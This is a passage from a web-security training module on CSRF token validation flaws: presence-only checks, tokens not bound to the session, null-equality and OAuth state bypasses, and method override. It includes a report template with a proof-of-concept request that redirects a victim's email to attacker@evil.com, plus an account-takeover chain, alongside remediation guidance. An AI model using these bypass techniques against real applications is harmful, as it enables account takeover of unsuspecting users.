  □ Account deletion — missing token = account loss
  □ Admin privilege grant — missing token = privilege escalation
  □ OAuth callback — missing state validation = account linking attack
  □ Login form — missing token = login CSRF → data harvesting
  □ Payment/billing endpoints — missing token = financial impact

VALIDATION TESTING PRIORITY:
  □ Test C first: random value → 200 OK = presence-only (most common finding)
  □ Test D second: cross-user token → 200 OK = not session-bound
  □ Test A last: missing token → 200 OK = no validation at all

CHAIN HUNTING:
  □ Subdomain enumeration → takeover candidates → SameSite bypass
  □ CSRF token in any URL → Referer leakage + analytics resource
  □ CORS origin reflection → token read → full bypass
  □ XSS anywhere on origin → token extraction → CSRF
```

### Report Template for Implementation Flaws

```markdown
## Title
CSRF Token Validation Bypass: [Specific Failure Mode] on [Endpoint]

## Severity
Critical — [Endpoint] allows [action] without valid CSRF token

## Vulnerability
The [endpoint] implements a CSRF token field but validation is insufficient:
[Presence-only / Not session-bound / Null bypass / etc.]

## Proof of Concept

### Step 1: Confirm vulnerability
Send request with csrf_token=[RANDOM_VALUE]:
POST /change-email HTTP/1.1
Cookie: session=VICTIM_SESSION
csrf_token=aaaaaaaaaaaaaaaaaaaaa&email=attacker@evil.com

Response: 200 OK — email changed

### Step 2: CSRF PoC
[HTML payload]

## Impact Chain
1. Attacker hosts malicious page
2. Authenticated victim loads page
3. Email changed to attacker@evil.com
4. Attacker initiates password reset
5. Reset link delivered to attacker's inbox
6. Attacker sets new password
7. Full account takeover

## Root Cause
Token value is not compared against session-stored expected value.
Server only verifies token field presence.

## Remediation
1. Retrieve expected token from session: expected = session['csrf_token']
2. Reject if submitted token is empty or missing
3. Use constant-time comparison: hmac.compare_digest(submitted, expected)
4. Ensure token is session-bound and single-use
```

---

## 19. Module 10 Summary — What You Must Know Cold

```
PRESENCE-ONLY VALIDATION:
✓ Most common real-world CSRF implementation failure
✓ Scanner sees token present → marks as "protected" → FALSE
✓ Test: send random value → if 200 OK = presence-only
✓ Fix: compare submitted value against session-stored expected value

TOKEN NOT SESSION-BOUND:
✓ Attacker uses own valid token against victim's session
✓ Test: use own account's token in request with victim's session cookie
✓ If 200 OK: global token pool or incorrect storage
✓ Fix: store token keyed to specific session, validate against that session

NULL EQUALITY BYPASS:
✓ None == None → True in most languages
✓ Occurs when: token absent, session expired, token consumed
✓ Fix: explicit empty/null rejection BEFORE comparison
✓ Applies to: CSRF tokens, OAuth state, password reset tokens, API keys

OAUTH STATE PARAMETER:
✓ state = CSRF token for OAuth flows
✓ Must be: random, per-session, single-use (pop not get), null-checked
✓ Null bypass: if state == session.get('state') → None == None → True
✓ Replay: session.get() doesn't remove → same state reusable

LOGIN CSRF:
✓ No CSRF on login = attacker can force victim to log in as attacker
✓ Victim submits real data (payment, OAuth, addresses) into attacker's account
✓ Frameworks often only protect authenticated routes — login is missed

METHOD OVERRIDE:
✓ _method=DELETE in POST form bypasses method-specific CSRF exemptions
✓ skip_before_action for DELETE applies to _method overrides too
✓ Always apply CSRF to the underlying HTTP method regardless of override

CVE PATTERNS:
✓ Presence-only validation: any value accepted
✓ Global token pool: any user's token valid for any session
✓ Method override: POST form bypasses DELETE/PUT exemption
✓ Login CSRF: forces attacker identity on victim
✓ Composite chain: subdomain takeover + leakage + SameSite bypass
✓ CORS + CSRF: origin reflection enables JSON CSRF + response read
✓ Framework default: .csrf().disable() with session cookies

TESTING CHECKLIST:
✓ Remove token → 403?
✓ Empty token → 403?
✓ Random value → 403?  ← most important test
✓ Cross-user token → 403?
✓ Token in any URL? → Referer leakage risk
✓ Login form has token? → Login CSRF check
✓ OAuth state: null check + pop() + constant-time?
```

---

*Next: Module 11 — Secure Design Reviews*  
*Given application architectures and code, identify what is protected,*
*what is exposed, and what constitutes a complete defense —*
*thinking like a security architect, not just a vulnerability finder*